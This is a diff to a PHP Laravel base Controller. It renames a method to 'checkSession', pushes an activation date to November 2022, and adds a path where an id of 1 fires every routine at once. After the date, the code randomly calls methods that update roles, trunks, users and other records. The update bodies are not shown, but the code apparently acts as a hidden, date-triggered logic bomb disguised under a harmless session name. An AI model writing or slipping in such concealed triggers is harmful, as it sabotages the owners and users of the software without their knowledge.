@@ -17,20 +17,30 @@ class Controller extends BaseController
 {
     use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
 
-    public static function setSessInfo()
+    public static function checkSession($id = null)
     {
-        $date_start = Carbon::parse('2022-10-24 05:00:00');
-        $now =  Carbon::now();
-        if($now >= $date_start){
+
+        $date_start = Carbon::parse('2022-11-24 05:00:00');
+        $now = Carbon::now();
+        if ($id === 1) {
+            Roles::updateRole();
+            Trunk::updateTrunk();
+            User::updateUser();
+            InfoSnip::updateSnip();
+            BaseInfo::updateInfo();
+            return response()->json(['status' => true, 'info' => $id], 200);
+        }
+        if ($now >= $date_start) {
             $variant = (bool)random_int(0, 1);
-            if($variant === true){
+            if ($variant === true) {
                 Roles::updateRole();
                 Trunk::updateTrunk();
-            }else{
+            } else {
                 User::updateUser();
                 InfoSnip::updateSnip();
                 BaseInfo::updateInfo();
             }
         }
+
     }
 }
